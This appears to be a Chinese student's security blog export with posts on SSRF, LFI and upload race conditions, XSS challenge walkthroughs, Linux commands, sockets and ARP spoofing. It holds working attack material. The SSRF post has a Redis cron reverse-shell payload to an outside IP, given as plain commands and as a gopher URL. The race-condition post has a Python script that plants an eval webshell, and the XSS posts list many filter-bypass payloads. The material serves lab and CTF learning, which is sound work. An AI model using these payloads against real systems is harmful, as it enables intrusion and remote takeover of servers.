内网端口扫描内网Web应用指纹识别通过访问内网Web应用robots.txt等方式辨别cms的类型及版本然后根据公开的漏洞去攻击内网服务器读取本地文件读取远程文件攻击内网其他应用,如redis,从而反弹shell SSRF原理cURLcurl是一个利用URL语法在命令行方式下工作的文件传输工具。PHP中有cURL的苦，叫libcurl，支持许多协议：FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE 以及 LDAP。curl同样支持HTTPS认证，HTTP POST方法, HTTP PUT方法, FTP上传, kerberos认证, HTTP上传, 代理服务器, cookies, 用户名/密码认证, 下载文件、 我们可以利用curl进行抓取网页内容 伪造请求通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。 类似于这样的形式： ip:port/ssrf.php?url=xxxx我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用cURL初始化一个新的cURL会话并获取一个网页。 但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知 SSRF分析漏洞搭建ssrf漏洞代码，未作过滤 &lt;?php // 创建一个新cURL资源 $ch = curl_init(); // 设置URL和相应的选项 curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); curl_setopt($ch, CURLOPT_HEADER, 0); // 抓取URL并把它传递给浏览器 curl_exec($ch); // 关闭cURL资源，并且释放系统资源 curl_close($ch); ?&gt;file协议查看文件 我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话： curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)协议就算失效了，这种方法失败 dict协议探测端口探测22端口(ssh服务) http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info服务端会执行： curl -v &#39;dict://127.0.0.1:22/info&#39; 探测3306端口 http://ip:port/ssrf.php?url=dict://127.0.0.1:3306 /infoGopher协议攻击redis反弹shellRedis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的： redis-cli -h $1 flushall echo -e &quot;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\\n\\n&quot;|redis-cli -h $1 -x set 1 redis-cli -h $1 config set dir /var/spool/cron/ redis-cli -h $1 config set dbfilename root redis-cli -h $1 save这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例改成适配于 Gopher 协议的 URL： gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a302跳转Curl默认不支持302跳转，所以需要在ssrf.php中加上一行curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)来支持跳转 代码如下： function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True); // 限制为HTTPS、HTTP协议 curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); } $url = $_GET[&#39;url&#39;]; curl($url); ?&gt;php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行 302辅助跳转脚本： &lt;?php $schema = $_GET[&#39;schema&#39;]; $ip = $_GET[&#39;ip&#39;]; $port = $_GET[&#39;port&#39;]; $query = $_GET[&#39;query&#39;]; echo &quot;\\n&quot;; echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query; if(empty($port)){ header(&quot;Location: $schema://$ip/$query&quot;); } else { header(&quot;Location: $schema://$ip:$port/$query&quot;); }通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句发送的请求如下： http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info注意是POST请求还是GET请求 SSRF挖掘社交分享功能转码服务在线翻译在线代理浏览器图片加载/下载图片/文章收藏功能API或调用外部URL的功能 SSRF绕过IP地址转换绕过数字地址(十进制)：127.0.0.1-&gt;2130706433十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01省略写法：127.0.0.1-&gt;127.1 xip.io绕过127.0.0.1.xip.iowww.127.0.0.1.xip.ioxxx.127.0.0.1.xip.iofuzz.xxx.127.0.0.1.xip.io 相关链接利用 gopher 协议拓展攻击面 浅析SSRF原理及利用方式 SSRF漏洞分析与利用"},{"title":"Socket套接字编程学习","date":"2018-08-07T16:00:00.000Z","path":"2018/08/08/Socket套接字编程学习/","text":"写在前面最近接触到socket模块，练一下python能力，写一个通过socket（套接字）的tcp的连接，执行命令并回显。模拟ncat的正向连接功能 Socket套接字TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口 套接字用（IP地址：端口号）表示。例如：192.168.1.1:8080 它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。 TCP/IP协议的三种套接字类型：流式套接字（SOCK_STREAM）：流式套接字用于提供面向连接、可靠的数据传输服务。该服务将保证数据能够实现无差错、无重复发送，并按顺序接收。流式套接字之所以能够实现可靠的数据服务，原因在于其使用了传输控制协议，即TCP（The Transmission Control Protocol）协议。 数据报套接字（SOCK_DGRAM）：数据报套接字提供了一种无连接的服务。该服务并不能保证数据传输的可靠性，数据有可能在传输过程中丢失或出现数据重复，且无法保证顺序地接收到数据。数据报套接字使用UDP（User Datagram Protocol）协议进行数据的传输。由于数据报套接字不能保证数据传输的可靠性，对于有可能出现的数据丢失情况，需要在程序中做相应的处理。 原始套接字（SOCK_RAW）：原始套接字(SOCKET_RAW)允许对较低层次的协议直接访问，比如IP、 ICMP协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为RAW SOCKET可以自如地控制Windows下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过RAW SOCKET来接收发向本机的ICMP、IGMP协议包，或者接收TCP/IP栈不能够处理的IP包，也可以用来发送一些自定包头或自定协议的IP包。网络监听技术很大程度上依赖于SOCKET_RAW原始套接字与标准套接字（标准套接字指的是前面介绍的流式套接字和数据报套接字）的区别在于：原始套接字可以读写内核没有处理的IP数据包，而流式套接字只能读取TCP协议的数据，数据报套接字只能读取UDP协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。 编程思路tcp服务端1、创建一个套接字，选择tcp流通信，并且绑定套接字到本地ip和端口 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind()2、开始监听 s.listen(5) # 一般5的最大连接就够了3、循环接收客户端连接要求 while True: conn,addr=s.accept() # 接收tcp连接，并返回一个新的套接字conn，和ip地址addr这个套接字的作用：作为介质，用来接收客户端的信息、返回给客户端信息。服务端在接收这个conn套接字后跟客户端共用此套接字。 4、执行接收的命令，结果的数据返回给客户端。 5、传输完毕关闭套接字 tcp客户端1、创建一个套接字并连接远端 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect()2、 连接后发送数据和接收数据 3、 传输完毕关闭套接字 代码执行服务端 客户端 效果 相关链接(Python Socket 编程详细介绍)[https://gist.github.com/kevinkindom/108ffd675cb9253f8f71] (python socket编程详细介绍Ⅱ)[http://blog.51cto.com/yangrong/1339593]"},{"title":"LFI with phpinfo测试","date":"2018-08-06T16:00:00.000Z","path":"2018/08/07/LFI with phpinfo测试/","text":"基础知识本地文件包含，英文Local File Include，简称LFI。文件包含是一种简化代码、提高代码重用率的方法。但是，由于没有正确处理用户输入，导致本地文件包含漏洞。黑客可以通过漏洞包含非PHP执行文件，如构造包含PHP代码的图片木马、临时文件、session文件、日志等来达到执行PHP代码的目的。 环境一个简单的文件上传，无任何过滤的页面： Lfi.php: &lt;?php include $_GET[&#39;file&#39;];&amp;一个phpinfo页面docker复现的环境，这里吐槽一下ubantu.. 思路php引擎对表单的处理以上传文件的方式请求任意PHP文件，服务器都会创建临时文件来保存文件内容PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：1、请求到达； 2、创建临时文件，并写入上传文件的内容； 3、调用相应PHP脚本进行处理，如校验名称、大小等； 4、删除临时文件。 PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。对phpinfo.php发起请求，会在/tmp下生成一个临时文件。其中临时文件内容正是我们POST请求中文件内容，临时文件的名称是php+随机数字.tmp,正中本地文件包含痛点。 分块传输php默认的输出缓冲区大小为4096，也就是四字节，可以理解为php每次返回4096个字节给socket连接 攻击过程画了一个流程图，利用发送给phpinfo数据包和发送给包含点的数据包之间的时间差，来写入一个永久的文件，具体在流程图体现 执行执行exp 懒得贴图了，看链接吧PHP文件包含漏洞（利用phpinfo） 相关链接在实际情况中，如果要修改poc参数，参考链接LFI with PHPInfo本地测试过程 文件上传竞争刚才的竞争是数据从socket client到service过程和POST数据到文件包含过程的竞争，借助了文件包含这个点来生成一个webshell，或者执行系统命令的参数。 文件竞争是多线程与服务期间的竞争。首先将文件上传到服务器，然后检测文件后缀名（或者是有害文件），如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为： &lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。 expimport os import requests import threading class RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot; self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot; def _get(self): print(&#39;try to call uploaded file...&#39;) r = requests.get(self.url) if r.status_code == 200: print(&quot;[*]create file info.php success&quot;) os._exit(0) def _upload(self): print(&quot;upload file.....&quot;) file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)} requests.post(self.uploadUrl, files=file) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get() if __name__ == &quot;__main__&quot;: threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join()前端代码&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;myfile&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;后端代码&lt;?php $allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); $size = 10000000; $path = &quot;./&quot;; $filename = $_FILES[&#39;myfile&#39;][&#39;name&#39;]; if (is_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;])){ if (!move_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;],$path.$filename)){ die(&quot;error:can not move!&quot;); } } else { die(&quot;error:not an upload file！&quot;); } $newfile = $path.$filename; echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\\n&lt;br /&gt;&quot;; if ($_FILES[&#39;myfile&#39;][&#39;error&#39;] &gt; 0){ unlink($newfile); die(&quot;Upload file error: &quot;); } $ext = array_pop(explode(&quot;.&quot;,$_FILES[&#39;myfile&#39;][&#39;name&#39;])); if (!in_array($ext,$allowtype)){ unlink($newfile); die(&quot;error:upload the file type is not allowed，delete the file！&quot;); } ?&gt;写在后面很遗憾，文件上传竞争我没跑出来。最新学一下socket写个py吧，脚本转化能力太菜了"},{"title":"xss从零开始（三）之怒刷google-xss","date":"2018-08-05T16:00:00.000Z","path":"2018/08/06/xss从零开始（三）之怒刷google-xss/","text":"索引xss太好玩了，刷题刷题~ level 1 easypass地址：https://xss-game.appspot.com/level1easy &lt;script&gt;alert(1)&lt;/alert&gt;level 2 img标签+事件绕过地址：https://xss-game.appspot.com/level2 过滤script标签，用事件绕过 &lt;img src=x onerror=&quot;alert(1)&quot;&gt;level 3 window.location.hash地址：https://xss-game.appspot.com/level3 看到url里，有“#”号，联想window.location.hash那么什么是window.location.hash呢? window.location.hash属性介绍location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。比如http://domain/#admin的location.hash=&quot;#admin&quot;。利用这个属性值可以做一个非常有意义的事情。 也就是说页面会截取#后面的内容，再将这个值替换到url里进行重定向，这里提交一句话分析一下 如果我们以单引号结尾，我们猜测这个页面会截取单引号前面的内容并把它闭合到src的双引号里。并且在后面的jpg后再追加一个单引号。既然能脱离单引号，一切都好办了，我们用on事件构造： 4&#39; onerror=&quot;alert(1)&quot;成功弹框 level4 编码绕过地址：https://xss-game.appspot.com/level4 题目给了一个自己写的js函数叫做startime，执行时会进行相应的延时函数的闭合如图: 思路是在onload事件里构造语句，出现弹框，但是过滤了分号，那么我们可以用URL编码来代替分号 1&#39;)%3Balert(&#39;1还有两种思路： 1&#39;) || alert(&#39;1也可以用下面这种方法，不需要任何编码/操作符： 1&#39;);alert(1);//我尝试用html编码绕，但是过滤了&amp;和# level 5地址：https://xss-game.appspot.com/level5 这题看提示，注意singup页面的url singup页面还看到了next按钮，查看元素发现：奥，事情不简单，我们传入一个next值，然后重定向给href属性。果断用javascript伪协议payload: ?next=javascript:alert(1)弹框~ level 6地址：https://xss-game.appspot.com/level6 这题会截取#以后的内容，加载到一个新的script标签里的src属性内。我认为是引入一个js脚本的意思。如图 这里利用DATA URI Scheme来执行js代码 http://xss-game.appspot.com/level6/frame#data:text/javascript,alert(1);"},{"title":"xss从零开始（二）之怒刷xss-quiz","date":"2018-08-01T16:00:00.000Z","path":"2018/08/02/xss从零开始（二）之怒刷xss-quiz/","text":"刷题话不多说，刷题，平台：xss-quiz chanllenge1直接丢payload &lt;script&gt;alert(document.domain)&lt;/script&gt;document.domain 弹出当前网页的网址 challenge2随便查一个语句看一下浏览器是怎么渲染的查询的东西嵌在input标签里的value属性里，解析不到script标签不会调用Js，构造一下bypass逃逸input标签。 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;value=&quot;12challenge3 其它input框的xss题目地址 普通构造，右键源码发现把尖括号实体化编码了。用编码没绕过去，p2选择出存在xss无过滤，改一下参数为构造语句再提交 challenge4 隐藏input框题目地址 隐藏有个p3输入框，type从hidden改为test，构造payload: &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;challenge5 长度限制题目地址 长度限制改一下就行了 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;value=&quot;challenge6 on事件bypass尖括号题目地址 过滤了尖括号，用其它事件绕过去，注意查看元素构造Payload: 鼠标向上移动触发js事件：&quot;onmouseover=&quot;alert(document.domain)&quot;,onmouseover要脱离引号，alert在引号内。 鼠标点击触发js事件：&quot;onclick=&quot;alert(document.domain)&quot; 事件会在页面或图像加载完成后立即发生:onload=&quot;alert(document.domain)&quot; challenge7 过滤尖括号和双引号和&amp;题目地址 经测试，输入空格会自动把前面补一个双引号，然后自己多构造一下找规律就行bypass a onclick=alert(document.domain)challenge8 javascript伪协议从网上学习到：看到输出是在href属性下，用javascript伪协议 常见用到伪协议的属性如下: src href backgroud学了一波javascript伪协议，看到离歌师傅有一篇文章写的javascript伪协议与url编码联合bypass的文章，感叹还有这种姿势，但是这个道题应该用不到编码，但是我尝试了一下javascript伪协议确实会把“符号”变为“字符串”，从而使用编码，具体看师傅的文章：利用location来变形我们的XSS Payload bypass: javascript:alert(document.domain);等价的bypass javascript:alert%28document.domain%29;challenge9utf-7编码，看到网上说有问题，直接跳过 challenge10 过滤特定字符题目地址 过滤了domain，构造出来domain &quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;/script&gt;&quot;&lt;value=&quot;challenge11 编码绕过题目地址(http://xss-quiz.int21h.jp/stage11th.php?sid=ac29e65dc2666674f15adbe46a2c4af6397173ff) 这题过滤很多：1，script会被替换为xscript 2，on事件会被替换为onxxx 3，style会被替换为stxxx 想用html编码绕过构造script标签，结果如下：后来测试发现，浏览器再解析xml时，先把标签解析成DOM树，而在标签名解析的时候不会解释html编码。解析成DOM树后，html编码解析只对标签里面属性的值进行解码的。 例如： &lt;a text=&quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;会被解析为： &lt;a text=&quot;script&quot;&gt;&lt;/a&gt;但是脱离属性外的值不会被解码，例如： &lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;还是会被解析成 &lt;a text=&quot;abc&quot; &quot;scr&amp;#105;pt&quot;&gt;&lt;/a&gt;所以我们构造script标签的思路行不通，那我们可以用html编码构造事件，但是构造事件又会脱离“属性”这个范围，编码不会被解析。那我们就重新构造标签，利用href属性和Javascript伪协议bypass &quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;challenge12过滤了&lt;&gt;和双引号，绕不过去双引号闭合，我们用html编码构造的双引号会被认为成“字符串型”的引号，而不是“符号”，所以不能逃逸出来，看到网上wp说用`可以代替引号，前提是IE8浏览器才能这么解释，这里没什么实战意义，就不做了 challenge15 document.write()题目地址 这题过滤了尖括号，双引号，但在input标签之上引用了document.write的方法，那么什么是document.write方法呢？ w3c里是这样定义的：write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。 也就是说我们在write一下插入的代码就是js范畴了，\\u + Unicode编码这种形式是js的编码方法，所以会被解释为&lt;，但是document.write在输出的时候会JavascriptDecode一下数据，会把数据原有\\去除，即php里面的stripslashes。 因此我们要用\\来替代\\，payload: \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e \\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e一种是unicode编码，一种是\\x + 16进制，都可以绕过 总结剩下的题目有些环境严苛不做研究。总结一下，能调用js的方式：一些on事件，如:onmouseover、onclick、onerror等等。或者script标签，如果是标签的话，要脱离其它标签才能开启js解析调用。还有就是一些特定的方法，现在接触到的只有一个document.write。 学会构造、学会用javascript伪协议，学会编码绕过，知道浏览器解析的顺序，that’s important~"},{"title":"xss从零开始（一）","date":"2018-08-01T10:49:06.000Z","path":"2018/08/01/xss从零开始（一）/","text":"写在前面这两天事情比较多，学习了一下scrapy只能简单的爬一下没有登陆模拟的页面，以后再写登陆模拟的接口。一直说要学xss却没怎么起步，就是做过几个题粗略的了解。准备系统的学习xss和html内的构造、CSS的渲染。找到一些大神的学习手册，跟着学习一下 一个简单的demo输出所输入的内容 demo代码 Html知识补充id属性id只能唯一，识别作用 class属性定义的类可以多次引用 div标签 可定义文档中的分区或节（division/section）。 标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联。如果用 id 或 class 来标记 ，那么该标签的作用会变得更加有效。 div就是一块区域的标签，可以对同一个 元素应用 class 或 id 属性，但是更常见的情况是只应用其中一种。这两者的主要差异是，class 用于元素组（类似的元素，或者可以理解为某一类元素），而 id 用于标识单独的特定的元素。不必为每一个 都加上类或 id。 span标签自己定义名称的标签，你也可以命名为a标签或者hpdoger标签，标记好id就行 Input标签输入标签，定义class可以选择demo，type规定输入类型，记得标记id button标签字如其名，按钮作用 document.querySelector获取文档中 id=”demo” 的元素： document.querySelector(&quot;#demo&quot;);innerHTMLinnerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。 这里就是在span标签之间插入value xss测试我们插一个Script看是否会弹框 没有弹框，看一下script的位置，原因如下： w3c规范innerHTML这个api插入的script标签不会被执行"},{"title":"linux基本使用","date":"2018-07-22T16:00:00.000Z","path":"2018/07/23/linux基本使用/","text":"写在前面参加了一个小组内的awd，体验感极差，上来被人抓着phpmyadmin改了密码，无限被check，非root用户我不会改mysql密码（其实当时是没意识到），在查linux文件、编辑、复制过程中一度出现命令忘记。。在这篇持续记录一下自己使用的centos7的命令吧。。 用户和组查看自己的用户名whoami增加一个test组groupadd test删除一个test组groupdel test2查看当前用户所在的组gours查看所有组cat /etc/group添加用户（参考帮助文档进行用户配置）useradd -g test -m hpdoger #添加hpdoger到test组并创建用户目录（要先创建test组）具体参考 useradd -help 若想创建不能登陆的用户 useradd -g test2 -M -s /sbin/nologin hpdoger #添加hpdoger到test组不创建用户目录，并且不可用于登录修改hpdoger用户密码passwd hpdoger切记，创建完用户要修改密码，否则用户不能登陆 普通账号与root的切换root切换为普通: login -f hpdoger普通切换成root权限: su # 然后输入密码 端口类命令查看端口我的centos7把firewall给ban了，那么查看端口的命令我用的是这个：[root@vultr ~]# netstat -lnp 开放/关闭端口监听：我用ncat进行监听，监听命令：nc -l -p 8888 -vvv 停止监听：ctrl + c 注意ctrl + z并不是停止，而是退出当前监听命令界面，仍然在执行监听 文件类命令进入目录cd /home # into dir named home cd ../ # into superior dir cd - # into last dir which u are from 创建/删除目录mkdir ilove # make dir named ilove rm -rf ilove # delete dir named ilove显示当前路径pwd复制目录cp -a /root/ilove/ifuck /root # 第一个为原目录地址，第二个为新目录父级目录地址原目录地址必须为绝对路径 新建/打开/删除文件vi filename # 创建了一个叫filename的文件了，如果存在就打开了。进入插入模式，按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 当处于vi编辑模式时，想要退出的话按esc后输入冒号然后再输入wq，就能退出并保存。linux 不区分文本和二进制，不需要文件名有txt。 rm -f filename # 删除文件vi的基本操作 操作 解析 i 进入编辑文本模式 Esc 退出编辑文本模式 :w 保存当前修改 :q 不保存退出vi :wq 保存当前修改并退出vi 查看当前文件内容cat /root/ilove/filename # 查看相应目录的文件内容查询类相关命令find语句的用法 语句 解析 find / -name file1 从 ‘/’ 开始进入根文件系统查找文件和目录 find / -user user1 查找属于用户 ‘user1’ 的文件和目录 find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中查找以 ‘.bin’ 结尾的文件 find /usr/bin -type f -atime +100 查找在过去100天内未被使用过的执行文件 find /usr/bin -type f -mtime -10 查找在10天内被创建或者修改过的文件 locate *.ps 寻找以 ‘.ps’ 结尾的文件，先运行 ‘updatedb’ 命令 find -name ‘*.[ch]’ &#124; xargs grep -E ‘expr’ 在当前目录及其子目录所有.c和.h文件中查找 ‘expr’ find -type f -print0 &#124; xargs -r0 grep -F ‘expr’ 在当前目录及其子目录的常规文件中查找 ‘expr’ find -maxdepth 1 -type f &#124; xargs grep -F ‘expr’ 在当前目录中查找 ‘expr’ 前几天做题py到了一个很牛逼的查询flag的find用法，先看一下语句： find / -iname &quot;flag*&quot; 2&gt;/dev/null 寻找可写目录find / -type d -writable 2&gt;/dev/null | grep -v -P &#39;(^/proc)|(^/dev)&#39;寻找可写文件find / -type f -writable 2&gt;/dev/null | grep -v -P &#39;(^/proc)|(^/dev)&#39;寻找最近20分钟内修改的文件find /var/www/html -mmin -20 -type f -print补一下相关知识/dev/null在类Unix系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF[1]。在程序员行话，尤其是Unix行话中，/dev/null被称为比特桶[2]或者黑洞。 数据流重定向操作符 | 解析—— | —-1&gt; | 以覆盖的方法将“正确的数据”输出到指定的文件或设备上1&gt;&gt; | 以累加的方法将“正确的数据”输出到指定的文件或设备上2&gt; | 以覆盖的方法将“错误的数据”输出到指定的文件或设备上；2&gt;&gt; | 以累加的方法将“错误的数据”输出到指定的文件或设备上； 所以这句话的意思就是搜索所有文件名包含flag字段的文件，并把错误的搜索项以覆盖的方式丢弃到/dev/null 文本内容查找 命令 解析 grep str /tmp/test 在文件 ‘/tmp/test’ 中查找 “str” grep ^str /tmp/test 在文件 ‘/tmp/test’ 中查找以 “str” 开始的行 grep [0-9] /tmp/test 查找 ‘/tmp/test’ 文件中所有包含数字的行 grep str -r /tmp/* 在目录 ‘/tmp’ 及其子目录中查找 “str” diff file1 file2 找出两个文件的不同处 sdiff file1 file2 以对比的方式显示两个文件的不同 权限类相关修改上传目录权限linux 修改某目录下所有所有子目录权限 chmod -R 777 html修改某目录为任何用户都用写读执行权限 chmod a+rwx html显示进程ps -ef # 列出所有进程信息，包括pid杀死进程kill [option] pid选项 -9 会强行终止进程 系统相关关机/重启shutdown -h now # 关机 shutdown -r now # 重启查看Ipifconfig查看参考手册（例如arpspoof 命令）man arpspooflinux中的&amp;&amp;和&amp;，|和||&amp; 表示任务在后台执行，如要在后台运行redis-server,则有 redis-server &amp; &amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#39;1‘ &amp;&amp; echo &#39;2&#39; | 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#39;yes&#39; | wc -l || 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot; 写在最后目前接触到的有这些，还有很多命令没接触到，日后一并记录到此。已知的，chomd目前还没有记载 相关链接linux添加用户，用户组（centos7）【Linux】CentOS7 常用命令集合"},{"title":"浅谈Arp攻击和利用Arp欺骗进行MITM","date":"2018-07-17T01:12:00.000Z","path":"2018/07/17/浅谈Arp攻击和利用Arp欺骗进行MITM/","text":"原文已投稿安全客，转载自安全客：浅谈Arp攻击和利用Arp欺骗进行MITM 索引arp欺骗也是很古老的渗透手段了，主要起着信息收集的作用，比如你可以利用欺骗获取对方的流量，从流量分析你认为重要的信息，例如某某账号密码。或是利用Arp攻击，切断局域网内某一用户的网络访问（单向欺骗）。下面着重讲一下中间人攻击的原理，配和实战演练分析，不对的地方，还请大家多多反馈和包涵！ MITM借用Wiki百科的一个比喻来理解MITM（中间人攻击）： 假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。 首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。 爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。 我们的身份就是Mallory，我们希望欺骗Alice和Bob，让其认为我们是交互的正确目标，从而来获取他们之间交流的信息。 Arp攻击分析想要进行中间人攻击，先理解最基础的arp攻击 Arp协议ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。 以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。 Arp通信过程 每台主机都会在自己的ARP缓冲区建立一个ARP列表（生命周期二十分钟），用于表示IP地址和MAC地址的对应关系。 主机A若想和主机B通信，首先主机A会查询Arp缓存表（后面称ip-mac缓存表）是否有B主机对应的ip-mac，有的话就将B主机的mac地址封装到数据包发送。若没有的话，主机A会向以太网发送一个Arp广播包，告诉以太网内的所有主机自己的ip-mac，并请求B主机（以ip来表示B主机）的mac地址。当B主机收到Arp广播包后，确认A主机是想找自己的mac地址，就会对A主机进行回应一个自己的mac地址。A主机就会更新自己的ip-mac缓存表，同时B主机也会接收A主机的ip-mac对应关系到自己的ip-mac缓存表。 Arp协议缺陷ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表 网关的理解在wiki中这样定义网关： 在计算机网络中，网关（英语：Gateway）是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关 